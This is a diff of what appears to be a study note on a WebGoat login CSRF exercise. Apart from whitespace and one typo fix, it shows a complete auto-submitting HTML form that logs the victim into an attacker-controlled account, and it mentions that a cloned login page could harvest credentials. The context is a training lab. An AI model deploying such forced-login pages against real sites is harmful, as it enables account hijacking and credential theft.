@@ -89,16 +89,16 @@ If I grasp it right, to solve is simply to craft a document like this and open i
     <form name="sample" 
           action="http://localhost:8080/WebGoat/login" 
           method="POST">
-	    <input type="hidden" 
-                   name='username' 
-                   value='csrf-theuser'/>
-	    <input type="hidden" 
-                   name='password' 
-                   value='theuser'/>
+      <input type="hidden" 
+             name='username' 
+             value='csrf-theuser'/>
+      <input type="hidden" 
+             name='password' 
+             value='theuser'/>
     </form>
     <script>document.sample.submit();</script>
   </body>
 </html>
 ```
-It could be assumed that document may have any sophisticated form, for example exact copy of original logn page thus allowing attacker to harvest credentials.
+It could be assumed that document may have any sophisticated form, for example exact copy of original login page thus allowing attacker to harvest credentials.
 Also need to carefully read [paper](http://seclab.stanford.edu/websec/csrf/csrf.pdf) from the exercise.
